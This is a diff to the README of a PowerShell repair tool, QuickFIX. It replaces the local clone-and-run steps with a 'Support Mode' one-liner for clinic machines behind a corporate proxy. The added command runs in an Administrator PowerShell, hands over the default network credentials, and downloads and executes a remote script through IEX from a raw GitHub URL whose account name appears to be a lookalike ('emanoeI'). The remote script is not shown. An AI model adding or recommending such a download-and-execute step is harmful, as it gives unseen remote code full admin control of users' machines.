@@ -21,8 +21,9 @@ No bloated third-party software. No unnecessary GUIs. Just pure, safe `Get-CimIn
 
 ## 🚀 How to fire it up
 
-1. Clone this repo or download `quickfix.ps1`.
-2. Open your terminal as Admin.
-3. If your execution policy is blocking you, temporarily bypass it:
-   ```powershell
-   Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+## 🚀 Quick Execution (Support Mode)
+
+If you are on a machine behind a corporate proxy (like in our clinic), run this command in an **Administrator PowerShell** to launch QuickFIX directly from the cloud:
+
+```powershell
+$wc = New-Object Net.WebClient; $wc.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials; IEX $wc.DownloadString('[https://raw.githubusercontent.com/emanoeI/QuickFIX/refs/heads/main/QuickFIX.ps1](https://raw.githubusercontent.com/emanoeI/QuickFIX/refs/heads/main/QuickFIX.ps1)')
